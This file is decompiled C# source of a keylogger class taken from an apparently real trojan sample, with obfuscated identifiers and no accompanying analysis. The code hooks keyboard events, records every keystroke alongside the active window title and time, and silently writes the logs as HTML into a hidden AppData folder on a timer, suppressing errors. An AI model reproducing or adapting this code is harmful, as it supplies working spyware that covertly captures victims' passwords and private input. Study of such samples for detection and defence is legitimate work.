// Decompiled with JetBrains decompiler
// Type: xClient.Core.Utilities.Keylogger
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities
{
  public class Keylogger : IDisposable
  {
    public static Keylogger Instance;
    private readonly System.Timers.Timer _timerFlush;
    private StringBuilder _logFileBuffer;
    private List<Keys> _pressedKeys = new List<Keys>();
    private List<char> _pressedKeyChars = new List<char>();
    private string _lastWindowTitle;
    private bool _ignoreSpecialKeys;
    private IKeyboardMouseEvents _mEvents;

    public bool IsDisposed { get; private set; }

    public static string LogDirectory => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.畐潈뵊ꯏ椭蔻稉䞍ྵ䓫\u23A8囫怪\uF84B\u2A3B宗\u33B6ᐭ퉇샚);

    public Keylogger(double flushInterval)
    {
      Keylogger.Instance = this;
      this._lastWindowTitle = string.Empty;
      this._logFileBuffer = new StringBuilder();
      this.Subscribe(摬ᾮᔼ毜\uF4A5ӱ졃㞶漟썋赇딯\uEC52ຂ\u2550\uFFFD\u2971堌撹竅.\uE2D8\uF502\u0F32\u0C91숏篴䥠\uF129\u192C뿠\uF8FD䏓㷢䞼௭\u280F똈纼퓤蚌());
      this._timerFlush = new System.Timers.Timer()
      {
        Interval = flushInterval
      };
      this._timerFlush.Elapsed += new ElapsedEventHandler(this.timerFlush_Elapsed);
      this._timerFlush.Start();
      this.WriteFile();
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (this.IsDisposed)
        return;
      if (disposing && this._timerFlush != null)
      {
        this._timerFlush.Stop();
        this._timerFlush.Dispose();
      }
      this.Unsubscribe();
      this.IsDisposed = true;
    }

    private void Subscribe(IKeyboardMouseEvents events)
    {
      this._mEvents = events;
      this._mEvents.\uE8C3\uFAFF䨹\u33D0싁핌荎륕沌䱱ⰾ圸半ꯝ쯲\uFFFDﶪ\uE226柮㴱 += new KeyEventHandler(this.OnKeyDown);
      this._mEvents.ﴓ촮װ䲸靆婨㨾塾䗭퉏訐ڌ\uF3B6薵䩭\uF32F倄൮\u1C3C㴏 += new KeyEventHandler(this.OnKeyUp);
      this._mEvents.樯ᴰ댖ᚲ聬做늸Ӛ阼ꈖႮ攖蹢\u3318璓ݮ鍝\u2BE2\uFFFD\uF0ED += new KeyPressEventHandler(this.OnKeyPress);
    }

    private void Unsubscribe()
    {
      if (this._mEvents == null)
        return;
      this._mEvents.\uE8C3\uFAFF䨹\u33D0싁핌荎륕沌䱱ⰾ圸半ꯝ쯲\uFFFDﶪ\uE226柮㴱 -= new KeyEventHandler(this.OnKeyDown);
      this._mEvents.ﴓ촮װ䲸靆婨㨾塾䗭퉏訐ڌ\uF3B6薵䩭\uF32F倄൮\u1C3C㴏 -= new KeyEventHandler(this.OnKeyUp);
      this._mEvents.樯ᴰ댖ᚲ聬做늸Ӛ阼ꈖႮ攖蹢\u3318璓ݮ鍝\u2BE2\uFFFD\uF0ED -= new KeyPressEventHandler(this.OnKeyPress);
      this._mEvents.Dispose();
    }

    private void OnKeyDown(object sender, KeyEventArgs e)
    {
      string input = Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬\uE93F錚櫺㩩㧷.\uFFFD挡멭텈\uF34E\uE476\uFFFD㨕\u20FFࢯ\uFD41躨珏\u29C1斢䌕䳓鋜ㄗ\u27B2();
      if (!string.IsNullOrEmpty(input) && input != this._lastWindowTitle)
      {
        this._lastWindowTitle = input;
        this._logFileBuffer.Append("<p class=\"h\"><br><br>[<b>" + Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬\uE93F錚櫺㩩㧷.둤闺\uE273\u2FF3\uF4FC짱䝨軟\u29D5ほ煄殞谜曢쬓\uE29C\u25A3\uF4EC\u20C6\u2916(input) + " - " + DateTime.Now.ToString("HH:mm") + "</b>]</p><br>");
      }
      if (this._pressedKeys.IsModifierKeysSet() && !this._pressedKeys.Contains(e.KeyCode))
      {
        this._pressedKeys.Add(e.KeyCode);
      }
      else
      {
        if (e.KeyCode.IsExcludedKey() || this._pressedKeys.Contains(e.KeyCode))
          return;
        this._pressedKeys.Add(e.KeyCode);
      }
    }

    private void OnKeyPress(object sender, KeyPressEventArgs e)
    {
      if (this._pressedKeys.IsModifierKeysSet() && this._pressedKeys.ContainsKeyChar(e.KeyChar) || this._pressedKeyChars.Contains(e.KeyChar) && Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬\uE93F錚櫺㩩㧷.\uF2EC\u2947憼ṅ朿쪘㓧啰墄豎\uF06B屙\u2858Ώ\uE1BB얥엩邸肶ᓺ(this._pressedKeyChars, e.KeyChar) || this._pressedKeys.ContainsKeyChar(e.KeyChar))
        return;
      string str = Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬\uE93F錚櫺㩩㧷.ꉥ姣鐔\u9FFF쬞흒\uF5AC\u2E22蘑铇斱甯\u334C\uEB91\uEC0D謨ݯ\u9FDD鈰\uE015(e.KeyChar);
      if (string.IsNullOrEmpty(str))
        return;
      if (this._pressedKeys.IsModifierKeysSet())
        this._ignoreSpecialKeys = true;
      this._pressedKeyChars.Add(e.KeyChar);
      this._logFileBuffer.Append(str);
    }

    private void OnKeyUp(object sender, KeyEventArgs e)
    {
      this._logFileBuffer.Append(this.HighlightSpecialKeys(this._pressedKeys.ToArray()));
      this._pressedKeyChars.Clear();
    }

    private string HighlightSpecialKeys(Keys[] keys)
    {
      if (keys.Length < 1)
        return string.Empty;
      string[] strArray = new string[keys.Length];
      for (int index = 0; index < keys.Length; ++index)
      {
        if (!this._ignoreSpecialKeys)
        {
          strArray[index] = Χ尡廬퓿ᾡꂫ芣簛앢쭭淺嚙͠뷇韬\uE93F錚櫺㩩㧷.晁ﻋ넳埰䲷䀞벞\uF39B킩滨\u2F16\uF354읍觊\u0895ନﴂ퍄巿\uE29E(keys[index]);
        }
        else
        {
          strArray[index] = string.Empty;
          this._pressedKeys.Remove(keys[index]);
        }
      }
      this._ignoreSpecialKeys = false;
      if (this._pressedKeys.IsModifierKeysSet())
      {
        StringBuilder stringBuilder = new StringBuilder();
        int num = 0;
        for (int index = 0; index < strArray.Length; ++index)
        {
          this._pressedKeys.Remove(keys[index]);
          if (!string.IsNullOrEmpty(strArray[index]))
          {
            stringBuilder.AppendFormat(num == 0 ? "<p class=\"h\">[{0}" : " + {0}", (object) strArray[index]);
            ++num;
          }
        }
        if (num > 0)
          stringBuilder.Append("]</p>");
        return stringBuilder.ToString();
      }
      StringBuilder stringBuilder1 = new StringBuilder();
      for (int index = 0; index < strArray.Length; ++index)
      {
        this._pressedKeys.Remove(keys[index]);
        if (!string.IsNullOrEmpty(strArray[index]))
        {
          switch (strArray[index])
          {
            case "Return":
              stringBuilder1.Append("<p class=\"h\">[Enter]</p><br>");
              continue;
            case "Escape":
              stringBuilder1.Append("<p class=\"h\">[Esc]</p>");
              continue;
            default:
              stringBuilder1.Append("<p class=\"h\">[" + strArray[index] + "]</p>");
              continue;
          }
        }
      }
      return stringBuilder1.ToString();
    }

    private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
    {
      if (this._logFileBuffer.Length <= 0 || \uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙.Exiting)
        return;
      this.WriteFile();
    }

    private void WriteFile()
    {
      bool flag = false;
      string str = Path.Combine(Keylogger.LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Keylogger.LogDirectory);
        if (!directoryInfo.Exists)
          directoryInfo.Create();
        if (仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.\uA4BD쉴펽緹殜꺤Ꝣ\uFFFD\uE635ⷻ퀘ৌ溅ᮚ뉄\u1B63\u2287沒\uEFB2㞖)
          directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        if (!File.Exists(str))
          flag = true;
        StringBuilder stringBuilder = new StringBuilder();
        if (flag)
        {
          stringBuilder.Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
          stringBuilder.Append("<style>.h { color: 0000ff; display: inline; }</style>");
          this._lastWindowTitle = string.Empty;
        }
        if (this._logFileBuffer.Length > 0)
          stringBuilder.Append((object) this._logFileBuffer);
        \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.쏸瓽䂃\uEE16뎛\uFFFD喀\uE56B垯祘\u2221\u236C\uFBCC\uE52B킘\u2FD8흉ⴚ暛簮(str, stringBuilder.ToString());
        stringBuilder.Clear();
      }
      catch
      {
      }
      this._logFileBuffer.Clear();
    }
  }
}
